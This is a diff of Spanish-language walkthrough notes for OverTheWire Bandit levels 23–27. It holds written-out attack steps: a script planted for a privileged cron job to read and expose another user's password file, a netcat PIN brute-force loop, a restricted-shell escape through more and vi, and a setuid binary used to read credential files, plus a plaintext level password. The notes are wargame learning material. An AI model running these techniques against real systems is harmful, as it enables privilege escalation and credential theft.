@@ -497,14 +497,64 @@ sshpass -p '0Zf11ioIjMVN551jX3CmStKLYqjk54Ga' ssh bandit23@bandit.labs.overthewi
             echo "Handling $i"
             owner="$(stat --format "%U" ./$i)" => se queda con el propietario creador del archivo
             if [ "${owner}" = "bandit23" ]; then
-                timeout -s 9 60 ./$i => tarera aislada.
+                timeout -s 9 60 ./$i => tarera aislada (ejecuta el archivo!!!)
             fi
             rm -f ./$i
         fi
     done
 
     cd /var/spool/bandit24/
-    touch test
 
-- Se creara un script: touch script.sh => chmod +x script.sh
-#!/bin/bash
+    dir_name=$(mktemp -d)
+    echo $dir_name => /tmp/tmp.btaQV4tx7d
+    cd $dir_name => para ahorrarse de escribir anterior!!!! MAS COMODO  
+
+    nano script.sh
+    chmod +x script.sh
+    chmod o+wx /tmp/tmp.btaQV4tx7d/
+    '''
+    #!/bin/bash
+    cat /etc/bandit_pass/bandit24 > /tmp/tmp.btaQV4tx7d/bandit24_password.org
+    chmod o+r /tmp/tmp.btaQV4tx7d/bandit24_password.org
+    '''
+    cp script.sh /var/spool/bandit24/foo/example
+    watch -n 1 ls -l
+
+# Un demonio está escuchando en el puerto 30002 y te dará la contraseña de bandit25 si recibes la contraseña de bandit24 y un código PIN secreto de 4 dígitos. No hay forma de recuperar el código PIN excepto revisando las 10 000 combinaciones, lo que se conoce como fuerza bruta.
+## No es necesario crear nuevas conexiones cada vez.
+__Fuerza bruta aplicada a conexiones__
+    for pin in {0000..9999}; do echo "0Zf11ioIjMVN551jX3CmStKLYqjk54Ga $pin"; done
+
+    dir_name=$(mktemp -d)
+    cd $dir_name
+    for pin in {0000..9999}; do echo "0Zf11ioIjMVN551jX3CmStKLYqjk54Ga $pin"; done > combinations.txt
+
+    cat combinatios.txt | nc localhost 30002 | grep -vE "Wrong|Pleace Enter"
+        -V DICE QUE TODO LO QUE TENGA ESTA CADENA SE IGNORA!
+     Y te entrega la pass!!!
+
+# Iniciar sesión en bandit26 desde bandit25 debería ser bastante sencillo… El shell del usuario bandit26 no es /bin/bash, sino otro. Descubre qué es, cómo funciona y cómo salir de él.
+## NOTA: Si usas Windows y sueles usar PowerShell para acceder a Bandit por SSH, se sabe que PowerShell causa problemas con la solución prevista a este nivel. Deberías usar el símbolo del sistema.
+__Escapando del contexto de un comando__
+    ssh -i bandit26.sshkey bandit26@localhost -> La conexión de Bandit26 te EXPULSA!
+
+    cat /etc/passwd | grep bandit26 => /usr/bin/showtext => NO ES UNA BASH
+
+- Para ver el MORE en su totalidad hay q hacer la ventana muy pequeña para alcarzar a ver un -MORE- (66%) aprox
+    - Ahora que se aprecia esto, con el caracter V se accede a un modo mas visible del MORE
+    - Con ESC+SHIFT+: => se le puede definir variables:
+        :set shell=/bin/bash
+
+        ahora al hacer enter y volver a hacer ESC+SHIFT+: => y escribir :shell se accedera a la bash, entrando a la bash se puede observar que hay dentro !!!!
+
+    Ahora dentro de la bash : cat /etc/bandit_pass/bandit26 => TE ENTREGA LA PASSWD 
+
+CABE DESTACAR QUE ESTA CLAVE NO SIRVE DE NADA YA QUE BANDIT26 NO ES UN BASH, SINO UN SHOWTEXT !!!!
+
+# ¡Buen trabajo consiguiendo un caparazón! ¡Ahora date prisa y consigue la contraseña de bandit27!
+    ls -l => bandit27-do
+
+    ./bandit27-do cat /etc/bandit_pass/bandit27 => ENTREGA LA CLAVE DE BANDIT27
+
+# Hay un repositorio Git en ssh://bandit27-git@localhost/home/bandit27-git/repo a través del puerto 2220. La contraseña del usuario bandit27-git es la misma que la del usuario bandit27.
+## Clonar el repositorio y buscar la contraseña para el siguiente nivel.
